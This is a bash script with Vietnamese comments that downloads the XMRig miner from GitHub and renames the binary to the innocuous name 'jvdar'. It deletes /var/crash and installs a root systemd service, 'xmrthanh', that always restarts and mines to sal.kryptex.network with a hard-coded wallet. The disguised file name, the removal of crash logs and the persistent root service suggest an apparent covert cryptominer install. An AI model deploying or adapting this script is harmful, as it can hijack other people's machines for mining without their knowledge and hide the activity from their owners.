# Chuyển vào thư mục /home
cd /home

# --- BẮT ĐẦU SỬA LỖI VÀ CẬP NHẬT ---
echo "--- Bắt đầu quá trình sửa lỗi và cập nhật ---"

# 1. Dừng dịch vụ (nếu nó đang chạy file CŨ)
sudo systemctl stop xmrthanh.service

# 2. Dọn dẹp tất cả các file cũ VÀ các file mới vừa bị giải nén lỗi
# (bao gồm 'xmrig', 'config.json', và các file 'Start-*.sh')
sudo rm -f jvdar ar xmrig-6.24.0-linux-static-x64.tar.gz
sudo rm -f xmrig config.json Start-Monero.sh Start-Salvium.sh "Start-Tari(XTM-RX).sh" Start-Zephyr.sh
sudo rm -rf /home/xmrig-6.24.0 # Xóa thư mục này cho chắc chắn (dù nó không tồn tại)

# 3. Tải lại file miner
sudo wget https://github.com/kryptex-miners-org/kryptex-miners/releases/download/xmrig-6-24-0/xmrig-6.24.0-linux-static-x64.tar.gz

# 4. Giải nén file (sẽ giải nén 'xmrig' và các file khác ra /home)
sudo tar -xzvf xmrig-6.24.0-linux-static-x64.tar.gz

# 5. *** SỬA LỖI QUAN TRỌNG ***
# File thực thi nằm ở /home/xmrig, không phải /home/xmrig-6.24.0/xmrig
sudo cp /home/xmrig /home/jvdar
sudo chmod +x jvdar

# 6. Dọn dẹp các file rác vừa giải nén (chúng ta chỉ cần file 'jvdar')
sudo rm -f xmrig config.json Start-Monero.sh Start-Salvium.sh "Start-Tari(XTM-RX).sh" Start-Zephyr.sh
sudo rm -f xmrig-6.24.0-linux-static-x64.tar.gz # Xóa file nén

# --- KẾT THÚC SỬA LỖI ---


# 7. Xóa và tạo lại file service (để đảm bảo sạch sẽ)
sudo rm -rf /lib/systemd/system/xmrthanh.service
sudo rm -rf /var/crash

sudo bash -c 'cat <<EOT >>/lib/systemd/system/xmrthanh.service
[Unit]
Description=xmrthanh
After=network.target
[Service]
ExecStart= /home/jvdar -o sal.kryptex.network:7028 -u SC1siDXtDCdNwUw534hFrJgCmyt7sMmEXJoMeNGBkVxpjhV4B4qsUfZFBw1kVCw3CQZBTptyxUW87PrTurhtbjnc526chgrabT6 -p 1svts28 -a rx/0 -k -t 43
WatchdogSec=36000
Restart=always
RestartSec=60
User=root
[Install]
WantedBy=multi-user.target
EOT
'

# 8. Tải lại, kích hoạt và khởi động dịch vụ MỚI
sudo systemctl daemon-reload
sudo systemctl enable xmrthanh.service
sudo systemctl restart xmrthanh.service

echo "--- ĐÃ SỬA LỖI: Cập nhật và khởi chạy XMRig 6.24.0 thành công ---"

# 9. Kiểm tra trạng thái dịch vụ (QUAN TRỌNG)
echo "Đang kiểm tra trạng thái dịch vụ sau 5 giây..."
sleep 5
sudo systemctl status xmrthanh.service
